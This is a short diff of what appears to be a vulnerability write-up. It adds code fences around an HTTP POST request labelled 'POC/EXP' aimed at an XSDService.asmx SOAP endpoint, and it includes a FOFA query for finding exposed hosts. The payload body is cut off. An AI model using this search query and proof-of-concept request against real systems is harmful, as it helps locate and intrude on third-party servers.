@@ -90,11 +90,13 @@ FOFA：body="XSDService.asmx"
 
 POC/EXP：
 
+```http
 POST /XSDService.asmx HTTP/1.1
 Host: 127.0.0.1
 Content-Type: text/xml; charset=utf-8
 Content-Length: length
 SOAPAction: "http://tempuri.org/SetMedia_Picture_info"
+```
 
 ```xml
 <?xml version="1.0" encoding="utf-8"?>
